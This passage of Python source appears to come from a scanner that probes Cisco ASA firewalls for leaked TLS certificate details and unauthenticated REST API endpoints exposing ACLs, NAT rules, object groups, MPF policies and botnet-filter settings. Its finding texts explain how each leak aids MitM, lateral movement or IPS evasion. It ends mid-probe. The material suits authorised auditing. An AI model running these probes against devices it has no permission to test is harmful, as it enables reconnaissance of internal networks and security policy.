                except Exception:
                    break
        except Exception:
            pass
        return sans

    def _parse_cert_der(der):
        """Parse X.509 DER cert. Returns dict: cn, issuer_cn, not_after,
        sans, is_self_signed."""
        r = {}
        try:
            _, cert_val, _ = _tlv(der, 0)         # Certificate SEQUENCE
            _, tbs_val, _ = _tlv(cert_val, 0)     # TBSCertificate SEQUENCE
            pos = 0
            if tbs_val[pos] == 0xa0:               # [0] EXPLICIT Version
                _, _, pos = _tlv(tbs_val, pos)
            _, _, pos = _tlv(tbs_val, pos)         # INTEGER serialNumber
            _, _, pos = _tlv(tbs_val, pos)         # SEQUENCE signature AlgID
            iss_s = pos
            _, iss_val, pos = _tlv(tbs_val, pos)   # SEQUENCE Issuer
            iss_raw = tbs_val[iss_s:pos]
            r['issuer_cn'] = _cn_from_rdnseq(iss_val)
            _, valid_val, pos = _tlv(tbs_val, pos) # SEQUENCE Validity
            _, nb_b, p2 = _tlv(valid_val, 0)
            _, na_b, _ = _tlv(valid_val, p2)
            r['not_before'] = nb_b.decode('ascii', errors='replace')
            r['not_after'] = na_b.decode('ascii', errors='replace')
            subj_s = pos
            _, subj_val, pos = _tlv(tbs_val, pos)  # SEQUENCE Subject
            subj_raw = tbs_val[subj_s:pos]
            r['cn'] = _cn_from_rdnseq(subj_val)
            r['is_self_signed'] = (iss_raw == subj_raw)
            _, _, pos = _tlv(tbs_val, pos)         # SEQUENCE SubjectPublicKeyInfo
            sans = []
            while pos < len(tbs_val):              # optional extensions
                try:
                    tag_x, xval, pos = _tlv(tbs_val, pos)
                    if tag_x == 0xa3:              # [3] EXPLICIT Extensions
                        _, exts_val, _ = _tlv(xval, 0)
                        ep = 0
                        while ep < len(exts_val):
                            try:
                                _, ext_seq, ep = _tlv(exts_val, ep)
                                ep2 = 0
                                _, oid_b, ep2 = _tlv(ext_seq, ep2)
                                if oid_b == b'\x55\x1d\x11':   # 2.5.29.17 = SAN
                                    if ep2 < len(ext_seq) and ext_seq[ep2] == 0x01:
                                        _, _, ep2 = _tlv(ext_seq, ep2)  # skip critical
                                    _, san_oct, _ = _tlv(ext_seq, ep2)
                                    sans = _san_list(san_oct)
                            except Exception:
                                break
                except Exception:
                    break
            r['sans'] = sans
        except Exception:
            pass
        return r

    # -- Probe 1: TLS certificate analysis ------------------------------------
    # ch22 (Step 3: Apply Identity Certificate): ASA presents its server cert
    # on the SSL VPN interface.  Self-signed = default config; internal
    # hostname/IP in CN or SAN leaks network naming; expired cert = hygiene gap.
    try:
        ctx1 = ssl.create_default_context()
        ctx1.check_hostname = False
        ctx1.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as rs1:
            with ctx1.wrap_socket(rs1, server_hostname=host) as ss1:
                cert_der = ss1.getpeercert(binary_form=True)
        if cert_der:
            ci = _parse_cert_der(cert_der)
            cn = ci.get('cn', '')
            issuer_cn = ci.get('issuer_cn', '')
            not_after = ci.get('not_after', '')
            is_self_signed = ci.get('is_self_signed', False)
            sans = ci.get('sans', [])

            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_CERT_DETAILS_EXPOSED',
                'detail': (
                    f'TLS certificate parsed from {host}:{port}: '
                    f'CN={cn!r}, IssuerCN={issuer_cn!r}, NotAfter={not_after!r}, '
                    f'SANs={sans[:8]}.  '
                    f'ch22: certificate details fingerprint operator org, internal '
                    f'naming convention, and CA chain for targeted phishing and '
                    f'cert-pinning bypass research.'
                ),
                'host': host,
                'port': port,
            })

            if is_self_signed:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ASA_SELF_SIGNED_CERT',
                    'detail': (
                        f'Self-signed certificate on {host}:{port} '
                        f'(CN={cn!r} == IssuerCN={issuer_cn!r}).  '
                        f'ch22: "use of an external CA is highly recommended"; '
                        f'self-signed cert = default config; clients cannot verify '
                        f'authenticity, enabling MitM without trusted-CA chain '
                        f'browser warning.  Clients trained to accept warning = '
                        f'future MitM acceptance.'
                    ),
                    'host': host,
                    'port': port,
                })

            internal_re = re.compile(
                r'(\b(?:10|172|192)\.\d+\.\d+\.\d+\b'
                r'|(?:internal|corp|intranet|vpn|asa|firewall|fw|gw|'
                r'gateway|dmz|lan)\b'
                r'|\.local$|\.internal$|\.corp$|\.lan$)',
                re.IGNORECASE,
            )
            if cn and internal_re.search(cn):
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'ASA_INTERNAL_HOSTNAME_IN_CERT',
                    'detail': (
                        f'Internal hostname/IP pattern in TLS certificate CN on '
                        f'{host}:{port}: CN={cn!r}.  '
                        f'ch22: ASA presented to clients with internal naming or '
                        f'RFC-1918 address in CN -- leaks network topology and '
                        f'naming schema; enables LDAP/NFS/SMB target enumeration '
                        f'from cert alone without credentials.'
                    ),
                    'host': host,
                    'port': port,
                })

            if not_after:
                try:
                    na = not_after.rstrip('Z')
                    if len(na) == 12:    # UTCTime YYMMDDHHMMSS
                        yr = int(na[:2])
                        yr += 2000 if yr < 50 else 1900
                        exp = _dt.date(yr, int(na[2:4]), int(na[4:6]))
                        if exp < _dt.date.today():
                            findings.append({
                                'severity': 'MEDIUM',
                                'title': 'ASA_EXPIRED_CERTIFICATE',
                                'detail': (
                                    f'TLS certificate on {host}:{port} expired '
                                    f'{exp.isoformat()} (NotAfter={not_after!r}).  '
                                    f'ch22: expired cert breaks client trust chain; '
                                    f'VPN sessions fail validation and users trained '
                                    f'to click through warnings, facilitating future '
                                    f'MitM acceptance.'
                                ),
                                'host': host,
                                'port': port,
                            })
                except Exception:
                    pass

            internal_sans = [
                f'{st}:{sv}' for st, sv in sans
                if internal_re.search(sv)
            ]
            if internal_sans:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'ASA_INTERNAL_SANS',
                    'detail': (
                        f'Internal hostnames/IPs in TLS certificate SANs on '
                        f'{host}:{port}: {internal_sans[:10]}.  '
                        f'ch22: SAN field enumerates all services sharing this cert; '
                        f'internal FQDNs/IPs expose network topology, DNS naming '
                        f'schema, and lateral movement targets to any client that '
                        f'inspects the presented certificate.'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # -- REST API helper ------------------------------------------------------
    ctx_r = ssl.create_default_context()
    ctx_r.check_hostname = False
    ctx_r.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _api_get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx_r) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode('utf-8', errors='replace')
            except Exception:
                return e.code, ''
        except Exception:
            return 0, ''

    # -- Probe 2: REST API /api/ssl -------------------------------------------
    # ch22 (SSL Settings): minimum TLS version and cipher suite per-interface
    # configured via ASDM Config > Device Management > Advanced > SSL Settings.
    # Unauthenticated read = full crypto policy exposure without credentials.
    sc2, body2 = _api_get('/api/ssl')
    if sc2 == 200 and body2:
        try:
            ssl_cfg = json.loads(body2)
            cfg_repr = str(ssl_cfg)[:400]
        except Exception:
            cfg_repr = body2[:300]
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_SSL_CONFIG_UNAUTH',
            'detail': (
                f'ASA REST API /api/ssl on {host}:{port} returned HTTP 200 '
                f'unauthenticated ({len(body2)} bytes).  '
                f'ch22: SSL config includes minimum TLS version, cipher suite list, '
                f'and interface-to-certificate bindings -- full crypto policy '
                f'exposed without credentials.  Response: {cfg_repr!r}'
            ),
            'host': host,
            'port': port,
        })
        cfg_lower = body2.lower()
        if any(kw in cfg_lower for kw in ('tlsv1.0', '"tlsv1"', 'tls1.0', 'sslv3', '"sslv3"', 'tlsv1 ')):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_WEAK_TLS_VERSION',
                'detail': (
                    f'TLS 1.0 or SSL 3.0 present in ASA SSL config from '
                    f'/api/ssl on {host}:{port}.  '
                    f'ch22: minimum TLS version below 1.2 exposes BEAST/POODLE/'
                    f'CRIME attack surface against AnyConnect and clientless '
                    f'VPN sessions.  Config excerpt: {body2[:300]!r}'
                ),
                'host': host,
                'port': port,
            })
        weak_hits = [
            c for c in ('null', 'export', 'rc4', 'des-', '3des', 'anon', 'md5')
            if c in cfg_lower
        ]
        if weak_hits:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_WEAK_CIPHER_CONFIGURED',
                'detail': (
                    f'Weak cipher keywords {weak_hits} in ASA SSL config from '
                    f'/api/ssl on {host}:{port}.  '
                    f'ch23 (Configuring DTLS): RC4-MD5/RC4-SHA break DTLS tunnel '
                    f'establishment; NULL/EXPORT ciphers provide no confidentiality; '
                    f'3DES is deprecated (Sweet32).  '
                    f'Config excerpt: {body2[:300]!r}'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 3: REST API /api/certificate/identity --------------------------
    # ch22 (Step 3): identity certs bound to ASA interfaces via
    # 'ssl trust-point <name> <interface>'.  Unauth listing exposes all
    # cert bindings, trustpoint names, and RSA key pair labels.
    sc3, body3 = _api_get('/api/certificate/identity')
    if sc3 == 200 and body3:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_CERT_BINDINGS_UNAUTH',
            'detail': (
                f'ASA REST API /api/certificate/identity on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body3)} bytes).  '
                f'ch22 (Identity Certificates): bindings reveal active cert per '
                f'interface, trustpoint names, and RSA key pair labels -- enables '
                f'targeted cert impersonation and key label reuse research.  '
                f'Response: {body3[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 4: REST API /api/certificate/ca --------------------------------
    # ch22 (Step 1: Obtaining a CA Certificate): CA certs define trust anchors
    # for VPN peer certificate authentication.  Exposed CA store reveals
    # trusted issuers enabling rogue cert issuance targeting.
    sc4, body4 = _api_get('/api/certificate/ca')
    if sc4 == 200 and body4:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_CA_STORE_UNAUTH',
            'detail': (
                f'ASA REST API /api/certificate/ca on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body4)} bytes).  '
                f'ch22: CA certificate store defines trusted issuers for '
                f'certificate-based VPN authentication (IKEv1/IKEv2 cert auth, '
                f'AnyConnect mutual TLS); exposed = enumerate trusted CAs for '
                f'rogue cert issuance targeting.  Response: {body4[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 5: LDAPS port 636 CA validation gap ----------------------------
    # ch7 (LDAP): ASA uses LDAP for VPN user auth on port 636 (LDAPS).
    # If LDAP server cert is not validated against a trustpoint CA, adversary
    # can intercept auth with a rogue cert and capture credentials.
    try:
        sock5l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock5l.settimeout(timeout)
        err5l = sock5l.connect_ex((host, 636))
        sock5l.close()
        if err5l == 0:
            ldap_cn = 'unknown'
            try:
                ctx5l = ssl.create_default_context()
                ctx5l.check_hostname = False
                ctx5l.verify_mode = ssl.CERT_NONE
                with socket.create_connection((host, 636), timeout=timeout) as rs5l:
                    with ctx5l.wrap_socket(rs5l, server_hostname=host) as ss5l:
                        ldap_der = ss5l.getpeercert(binary_form=True)
                if ldap_der:
                    ldap_ci = _parse_cert_der(ldap_der)
                    ldap_cn = ldap_ci.get('cn', 'unknown')
            except Exception:
                pass
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_LDAP_CA_VALIDATION',
                'detail': (
                    f'LDAPS port TCP/636 open on {host} (cert CN={ldap_cn!r}).  '
                    f'ch7 (LDAP): ASA LDAP auth on port 636 -- if the LDAP server '
                    f'cert is not validated against a trustpoint CA configured on '
                    f'the ASA, an adversary can intercept LDAP auth with a rogue '
                    f'cert, capturing VPN user credentials.  '
                    f'Verify: "crypto ca trustpoint" bound in ldap-server-config.'
                ),
                'host': host,
                'port': 636,
            })
    except Exception:
        pass

    # -- Probe 6: OCSP/CRL revocation configuration ---------------------------
    # ch22: Without revocation checking, compromised or stolen certs remain
    # valid for VPN authentication until expiry.  Detect via REST API.
    sc6, body6 = _api_get('/api/certificate/revocation')
    if sc6 == 200 and body6:
        cfg6 = body6.lower()
        if 'ocsp' not in cfg6 and 'crl' not in cfg6:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ASA_NO_REVOCATION_CHECK',
                'detail': (
                    f'ASA REST API /api/certificate/revocation on {host}:{port} '
                    f'returned HTTP 200 but no OCSP or CRL configuration found.  '
                    f'ch22: without revocation checking, compromised or stolen certs '
                    f'remain valid for VPN authentication until expiry; configure '
                    f'"revocation-check ocsp" under crypto ca trustpoint.'
                ),
                'host': host,
                'port': port,
            })
    elif sc6 not in (404, 0):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_NO_REVOCATION_CHECK',
            'detail': (
                f'ASA REST API /api/certificate/revocation returned HTTP {sc6} '
                f'on {host}:{port} (no revocation endpoint).  '
                f'ch22: absence of OCSP/CRL config leaves compromised peer certs '
                f'valid for VPN authentication; verify '
                f'"revocation-check ocsp" under crypto ca trustpoint.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_mpf_policy_exposure(host, port=443, timeout=10.0):
    """Detect Cisco ASA Modular Policy Framework (MPF) configuration exposure.

    Synthesized from:
      ch11 (Cisco Firewalls, Moraes): MPF uses class-map / policy-map /
      service-policy triplet.  class-map selects traffic (match-all or
      match-any); policy-map binds actions (inspect, police, priority,
      set connection) to class-maps; service-policy applies the policy-map
      globally or per-interface.  The global_policy service-policy is the
      ASA default and governs all inspection pinholes (DNS, FTP, H.323, SIP,
      SMTP, SQL*Net, etc.).  Exposing this structure via REST reveals every
      inspection pinhole and connection-limit action configured on the device.

      ch11 (IPS/AIP-SSM): class-maps of type 'inspect' with IPS actions
      (ips inline/promiscuous mode-fail-open/close) disclose whether inline
      IPS is deployed, which traffic classes hit the SSM, and the fail-open
      policy -- enabling an attacker to target traffic classes that bypass
      IPS on failure.

      ch07 (Handling ACLs and Object-Groups): object-group network defines
      collections of hosts/networks used in ACEs.  Unauth read of network
      object groups exposes the full internal addressing schema -- all IP
      ranges and host members -- without a single packet traversing the firewall.

      ch08 (Through ASA Using NAT): auto-NAT rules bind real addresses to
      mapped addresses per object.  Exposing auto-NAT rules via REST reveals
      every real-to-mapped IP translation pair, reconstructing the full
      internal address space from outside the firewall.

    Endpoints probed (all HTTPS, no auth assumed):
      GET /api/mpf/servicepolicy     -- MPF service-policy list
      GET /api/mpf/classmap          -- class-map definitions
      GET /api/access/global         -- global ACL policy
      GET /api/objects/networkgroups -- network object groups
      GET /api/objects/servicegroups -- service object groups
      GET /api/monitoring/threat/statistics -- threat detection stats
      GET /api/nat/rules/auto        -- auto-NAT rule table
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _api_get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode('utf-8', errors='replace')
            except Exception:
                return e.code, ''
        except Exception:
            return 0, ''

    # -- Probe 1: MPF service-policy list -------------------------------------
    # ch11: service-policy global_policy global -- the global policy governs
    # all inspection pinholes.  Unauth read discloses every policy name,
    # interface binding, and action set configured on the device.
    sc1, body1 = _api_get('/api/mpf/servicepolicy')
    if sc1 == 200 and body1:
        try:
            sp_data = json.loads(body1)
        except Exception:
            sp_data = None
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_MPF_POLICIES_UNAUTH',
            'detail': (
                f'ASA REST API /api/mpf/servicepolicy on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body1)} bytes).  '
                f'ch11: full MPF service-policy list exposed -- discloses all '
                f'inspection pinholes, connection-limit actions, and interface '
                f'bindings without credentials.  '
                f'Response excerpt: {body1[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for class-map names and policy actions
        body1_l = body1.lower()
        cm_hits = re.findall(r'"(?:classMapName|className|name)"\s*:\s*"([^"]{1,80})"',
                             body1, re.IGNORECASE)
        if cm_hits:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_MPF_CLASS_MAPS_DISCLOSED',
                'detail': (
                    f'Class-map names extracted from /api/mpf/servicepolicy on '
                    f'{host}:{port}: {cm_hits[:20]}.  '
                    f'ch11: class-maps define traffic selection criteria (ACL, '
                    f'port, dscp, default); exposed names reveal which traffic '
                    f'classes have inspection, rate-limit, or priority actions, '
                    f'enabling targeted bypass research.'
                ),
                'host': host,
                'port': port,
            })

        # Parse for IPS/AIP-SSM inspection rules
        if any(kw in body1_l for kw in ('ips', 'aip', 'ssm', 'ips inline', 'ips promiscuous',
                                         'fail-open', 'fail-close', 'ids')):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_IPS_INSPECTION_RULES',
                'detail': (
                    f'IPS/AIP-SSM inspection rules found in /api/mpf/servicepolicy '
                    f'on {host}:{port}.  '
                    f'ch11 (IPS/AIP-SSM): inline IPS class-maps and fail-open/'
                    f'fail-close policy exposed -- attacker can identify traffic '
                    f'classes that bypass IPS on SSM failure, enabling targeted '
                    f'evasion of inline inspection.  Excerpt: {body1[:300]!r}'
                ),
                'host': host,
                'port': port,
            })

        # Parse for rate-limit / priority-queue / QoS actions
        if any(kw in body1_l for kw in ('police', 'priority', 'qos', 'rate-limit',
                                         'priorityqueue', 'bandwidth')):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ASA_QOS_POLICIES_DISCLOSED',
                'detail': (
                    f'QoS policy actions (police/priority/bandwidth) found in '
                    f'/api/mpf/servicepolicy on {host}:{port}.  '
                    f'ch11: rate-limit and priority-queue actions disclose traffic '
                    f'shaping thresholds and priority class assignments -- reveals '
                    f'which flows are treated as critical and their bandwidth caps, '
                    f'useful for DoS targeting against deprioritized classes.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 2: class-map definitions ---------------------------------------
    # ch11: class-map match conditions (match access-list, match port,
    # match dscp, match tunnel-group) define which packets enter each policy
    # leg.  Exposed class-maps fully reconstruct the MPF traffic-selection logic.
    sc2, body2 = _api_get('/api/mpf/classmap')
    if sc2 == 200 and body2:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_CLASS_MAPS_UNAUTH',
            'detail': (
                f'ASA REST API /api/mpf/classmap on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body2)} bytes).  '
                f'ch11: class-map list discloses all traffic-selection criteria '
                f'(ACL refs, port matches, dscp values, tunnel-group names); '
                f'combined with policy-map reveals complete inspection and '
                f'connection-limit policy without credentials.  '
                f'Response: {body2[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 3: global ACL policy -------------------------------------------
    # ch07: global ACLs apply to all interfaces without direction qualifier.
    # Exposing global ACL reveals permitted/denied src-dst pairs for every
    # interface on the device -- the complete network security policy.
    sc3, body3 = _api_get('/api/access/global')
    if sc3 == 200 and body3:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_GLOBAL_ACL_UNAUTH',
            'detail': (
                f'ASA REST API /api/access/global on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body3)} bytes).  '
                f'ch07: global ACL applies to all interfaces; exposed ACE list '
                f'discloses the complete network-wide permit/deny policy without '
                f'credentials.  Response excerpt: {body3[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse ACL entries for permitted/denied source-dest pairs
        ace_hits = re.findall(
            r'"(?:sourceAddress|destinationAddress|src|dst|source|destination)"'
            r'\s*:\s*"([0-9./: a-fA-F]{4,50})"',
            body3,
        )
        if ace_hits:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_NETWORK_POLICY_DISCLOSED',
                'detail': (
                    f'Source/destination addresses extracted from global ACL on '
                    f'{host}:{port}: {ace_hits[:20]}.  '
                    f'ch07: ACE src/dst pairs disclose the full permit/deny '
                    f'network-segmentation policy -- reveals internal subnets, '
                    f'DMZ ranges, and external access restrictions without '
                    f'authenticating to the device.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 4: network object groups ---------------------------------------
    # ch07 (Example 7-23): object-group network defines collections of hosts
    # and networks used in ACEs.  Unauth read exposes all named groups and
    # their IP members -- full internal addressing schema.
    sc4, body4 = _api_get('/api/objects/networkgroups')
    if sc4 == 200 and body4:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_OBJECT_GROUPS_UNAUTH',
            'detail': (
                f'ASA REST API /api/objects/networkgroups on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body4)} bytes).  '
                f'ch07: network object groups define host/subnet collections for '
                f'ACL membership; exposed groups reveal all named IP groupings '
                f'and their members.  Response excerpt: {body4[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for IP ranges and host members
        ip_hits = re.findall(
            r'\b(?:10|172|192)\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?\b',
            body4,
        )
        if ip_hits:
            unique_ips = list(dict.fromkeys(ip_hits))
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_NETWORK_SEGMENTS_DISCLOSED',
                'detail': (
                    f'RFC-1918 IP ranges extracted from network object groups on '
                    f'{host}:{port}: {unique_ips[:30]}.  '
                    f'ch07: host and subnet members of object groups reconstruct '
                    f'the full internal addressing schema -- zone boundaries, '
                    f'server farms, DMZ ranges -- all without credentials.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 5: service object groups ---------------------------------------
    # ch07 (Example 7-24): service object-groups define port/protocol
    # collections.  Exposed groups reveal management port sets and allowed
    # service combinations used in ACLs.
    sc5, body5 = _api_get('/api/objects/servicegroups')
    if sc5 == 200 and body5:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_SERVICE_GROUPS_UNAUTH',
            'detail': (
                f'ASA REST API /api/objects/servicegroups on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body5)} bytes).  '
                f'ch07 (Example 7-24): service object groups define port/protocol '
                f'collections (TCP-MGMT, AUTH, SMB, etc.) used in ACL construction; '
                f'exposed groups reveal management port sets and allowed service '
                f'combinations for lateral movement planning.  '
                f'Response: {body5[:300]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 6: threat detection statistics ---------------------------------
    # ch11: ASA threat detection tracks scanning activity, burst rates, and
    # top offenders per protocol.  Exposed stats disclose active scanner
    # detections, top-talkers, and whether basic/advanced threat detection
    # is enabled -- defensive posture disclosed without credentials.
    sc6, body6 = _api_get('/api/monitoring/threat/statistics')
    if sc6 == 200 and body6:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_THREAT_STATS_UNAUTH',
            'detail': (
                f'ASA REST API /api/monitoring/threat/statistics on {host}:{port} '
                f'returned HTTP 200 unauthenticated ({len(body6)} bytes).  '
                f'ch11 (Threat Detection on ASA): threat stats disclose active '
                f'scanner detections, burst-rate thresholds, top-talker IPs, and '
                f'whether advanced threat detection is enabled -- reveals the '
                f'device\'s current threat posture and detection sensitivity without '
                f'credentials.  Response excerpt: {body6[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 7: auto-NAT rules ----------------------------------------------
    # ch08: auto-NAT (object NAT) binds real addresses to mapped addresses
    # inside network object definitions.  Each rule exposes a real-to-mapped
    # translation pair, reconstructing the full internal address space from
    # outside the firewall.
    sc7, body7 = _api_get('/api/nat/rules/auto')
    if sc7 == 200 and body7:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_NAT_RULES_UNAUTH',
            'detail': (
                f'ASA REST API /api/nat/rules/auto on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body7)} bytes).  '
                f'ch08 (Outbound NAT / Dynamic NAT / Static NAT): auto-NAT rule '
                f'table exposed -- each rule discloses a real address, mapped '
                f'address, and interface binding, reconstructing the full internal '
                f'address space from the outside.  '
                f'Response excerpt: {body7[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for translated IPs (real->mapped pairs)
        nat_real = re.findall(
            r'"(?:originalAddress|realAddress|real|original)"\s*:\s*"([^"]{4,50})"',
            body7, re.IGNORECASE,
        )
        nat_mapped = re.findall(
            r'"(?:translatedAddress|mappedAddress|translated|mapped)"\s*:\s*"([^"]{4,50})"',
            body7, re.IGNORECASE,
        )
        if nat_real or nat_mapped:
            pairs = list(zip(nat_real[:15], nat_mapped[:15]))
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_NAT_TRANSLATION_PAIRS',
                'detail': (
                    f'NAT real-to-mapped translation pairs from /api/nat/rules/auto '
                    f'on {host}:{port}: real={nat_real[:10]}, '
                    f'mapped={nat_mapped[:10]}.  '
                    f'ch08 (Defining Connection Limits with NAT Rules): each pair '
                    f'discloses an internal host or subnet and its public-facing '
                    f'mapped address, enabling full internal topology reconstruction '
                    f'and targeted inbound attack planning against real addresses.'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_botnet_url_filter_exposure(host, port=443, timeout=10.0):
    """Detect Cisco ASA dynamic database, URL filtering, and threat intelligence exposure.

    Synthesized from:
      ch12 (Botnet Traffic Filtering in ASA, Moraes): ASA Botnet Traffic
      Filtering (BTF) uses a dynamic database of known-bad domain names and
      IPs downloaded from Cisco's update server.  The database can be
      supplemented with static allow/deny lists.  Exposing the BTF config
      discloses the update URL, database state, and static list contents --
      an attacker who knows the database URL can predict detection coverage
      or pre-stage domains not yet flagged.

      ch12 (show xlate debug): the NAT translation table (xlate) records all
      active address translations.  Unauth read via REST exposes every
      active NAT pair in real time -- equivalent to running 'show xlate' on
      the device console without credentials.

      ch11 / ch12 (Connection Limits on ASA): the ASA connection table
      ('show conn') records all active TCP/UDP connections with src/dst
      IP:port pairs.  Unauth read exposes the full active session list,
      disclosing internal hosts, protocols, and peer addresses in real time.

      ch11 (SNMP / Threat Detection on ASA): ASA-specific SNMP OIDs under
      1.3.6.1.4.1.9.9.147 expose connection table counters (current
      connections, connection limit) -- equivalent to 'show conn count'
      and 'show conn limit' without CLI access.

    Endpoints probed (all HTTPS, no auth assumed):
      GET /api/botnet                     -- botnet traffic filter config
      GET /api/monitoring/connections     -- active connection table
      GET /api/monitoring/xlate           -- NAT xlate (translation) table
      GET /api/monitoring/traffic         -- interface traffic counters
      GET /api/monitoring/arp             -- ARP table
      SNMP UDP/161: OIDs 1.3.6.1.4.1.9.9.147.1.2.2.2.1.5 (conn limit)
                        1.3.6.1.4.1.9.9.147.1.2.2.2.1.4 (current conns)
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _api_get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode('utf-8', errors='replace')
            except Exception:
                return e.code, ''
        except Exception:
            return 0, ''

    def _snmp_int_query(host_s, community, oid, snmp_timeout=3):
        """Send SNMP v2c GET and return first INTEGER value from response."""
        pkt = _snmp_get_packet(community, oid, version=1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(snmp_timeout)
        try:
            sock.sendto(pkt, (host_s, 161))
            data, _ = sock.recvfrom(4096)
            # Walk bytes looking for INTEGER (tag 0x02) after the OID response
            i = 0
            while i < len(data) - 2:
                if data[i] == 0x02:  # BER INTEGER tag
                    raw_len = data[i + 1]
                    if raw_len < 0x80 and i + 2 + raw_len <= len(data):
                        val = int.from_bytes(data[i + 2:i + 2 + raw_len], 'big')
                        if val > 0:
                            return val
                i += 1
            return None
        except Exception:
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    # -- Probe 1: botnet traffic filter config --------------------------------
    # ch12: BTF config discloses dynamic database download URL and state,
    # static whitelist/blacklist entries, and interface bindings.
    sc1, body1 = _api_get('/api/botnet')
    if sc1 == 200 and body1:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_BOTNET_FILTER_UNAUTH',
            'detail': (
                f'ASA REST API /api/botnet on {host}:{port} returned HTTP 200 '
                f'unauthenticated ({len(body1)} bytes).  '
                f'ch12 (Botnet Traffic Filtering in ASA): BTF config exposed -- '
                f'discloses dynamic database state, static black/whitelist entries, '
                f'and interface traffic-filter bindings without credentials.  '
                f'Response excerpt: {body1[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Check for dynamic database download URL
        url_hits = re.findall(
            r'https?://[a-zA-Z0-9._/-]{6,120}',
            body1,
        )
        db_hits = [u for u in url_hits if any(
            kw in u.lower() for kw in ('botnet', 'database', 'update', 'cisco', 'db', 'malware')
        )]
        if db_hits:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_BOTNET_DB_UPDATE_URL',
                'detail': (
                    f'Botnet dynamic database update URL(s) exposed via '
                    f'/api/botnet on {host}:{port}: {db_hits[:5]}.  '
                    f'ch12: the dynamic database is downloaded from Cisco\'s '
                    f'update server on a configured interval; exposed URL reveals '
                    f'the update endpoint and schedule, enabling prediction of '
                    f'detection coverage gaps between update cycles.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 2: active connection table -------------------------------------
    # ch11 / ch12: 'show conn' exposes all active TCP/UDP sessions with full
    # 5-tuple (proto, src-IP, src-port, dst-IP, dst-port).  REST equivalent
    # without CLI access.
    sc2, body2 = _api_get('/api/monitoring/connections')
    if sc2 == 200 and body2:
